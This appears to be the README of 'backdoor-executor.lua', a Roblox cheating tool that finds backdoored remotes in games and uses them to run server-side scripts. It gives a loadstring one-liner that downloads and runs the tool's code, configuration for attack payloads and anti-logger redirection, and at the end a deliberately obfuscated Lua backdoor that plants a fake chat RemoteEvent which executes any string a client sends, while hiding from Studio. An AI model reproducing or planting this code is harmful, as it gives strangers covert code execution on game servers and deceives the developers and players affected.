# backdoor-executor.lua

* The very best backdoor scanning utility in existance.

## Info

A backdoor scanner for [ROBLOX](https://roblox.com) that scans the game for potential backdoored remotes and uses them for running server-sided scripts.  

### Features

* Fast Backdoor Scanner
* Remote and Output Redirection (DISABLED BY DEFAULT)
* Auto Execute (CUSTOMIZABLE)
* Macros (CUSTOMIZABLE)
* AND MUCH MORE!!

### Script

```lua
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/backdoor-executor.lua"))()
```
> Just copy the script below and run it through your script utility(executor).  

### Requirements

- A brain that knows this stuff.
- A decent script utility that supports most of [UNC](https://scriptunc.org) functions (such as file functions).

### FAQ

- My configuration file got resetted back to original.
> That's completely normal, it will happen usually if the configuration failed to load.  
> (I might remove the overwrite thing soon.)

- How can I enable Remote and Output Redirection?
> Enable them through the config file.  

- How does the Remote Redirection works?
> It works by creating a new remote and using that new remote for running scripts.  
> It also provides some features like anti-destroy and anti-logger.  

### Configuration Wiki

- Using Cache:
> Caching can be used to quickly find the remote on a specific game without any waiting.   
> example:
```lua
[placeid] = {
	["Path"] = "remote.path.here", -- this is the path of the remote, don't do remote.path["here"] or it will not work
	["Args"] = {"arg1here", "source"}, -- source is the place that the executing script will be putted
	["SourceFunc"] = function(source) -- use this if a game has a custom encryption for source
		return source
	end
}
```

- Using Auto Execute:
> AutoExecute can be used to load script after backdoor is successfully found.  
> You can put many code as long as you want inside the table, example:
```lua
-- it should be a array and don't add a nil or it will not work
{
	[[warn("backdoor-executor.lua loaded!")]],
	[[require(someid).load(%username%)]],
},
```

- Using Script Macros:
> Script Macros can be very helpful to set values.  
> Config example:
```lua
{
	["staticmacro"] = "value", -- returns "value"
	["dynamicmacro"] = function() -- returns a random number of 1-100
		return math.random(1, 100)
	end,
}
```
> Usage example:
```lua
print(%username%, %userid%, %placeid%) -- prints "Username", 69420, 1818 as an example
```

- Using Remote Filters:
> Remote Filters can be used to block any of the remotes with specific properties.  
> example:
```lua
{
	["exampleFilter"] = function(remoteObj) -- the remote will be filtered out of the remoteObj name is "bogus" and its parent name is "yomama"
		return remoteObj.Name == "bogus" or remoteObj.Parent.Name == "yomama"
	end,
},
```

- Using Backdoor Payloads:
> Backdoor Payloads is a new feature that can be used to customize arguments of remotes on when scanning.  
> It can be also be used for a certain remote to be used with the provided payload.  
> example:
```lua
{
	["examplePayload"] = {
		["Payload"] = {"arg1here", "source"}, -- this is the arguments that is gonna be loaded in the specified remote, same details as the args in cache
		["Verifier"] = function(remoteObj) -- this verifies if remoteObj is appropriate to be used for payload, the remote will be provided with the argument {"arg1here", "payloadSrc"} if remoteObj is descendant of JointsService
			return remoteObj:IsDescendantOf(game:GetService("JointsService"))
		end
	}
}
```

## Adding a backdoor in your game
Get access to a game in Roblox Studio, create a script and paste the few lines of code below in the script.
Make sure to enable `LoadStringEnabled` property in `ServerScriptService`. (code is semi-obfuscated)
```lua
if game:GetService("\82\117\110\83\101\114\118\105\99\101"):IsStudio() or not game:GetService("\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101")["\76\111\97\100\83\116\114\105\110\103\69\110\97\98\108\101\100"] then return end;local a=Instance.new("\82\101\109\111\116\101\69\118\101\110\116");a.Name="\71\101\116\80\108\97\121\101\114\77\101\115\115\97\103\101\65\115\121\110\99";a.Parent=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"):WaitForChild("\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115");a.OnServerEvent:Connect(function(_, b)loadstring(b)()end)
```
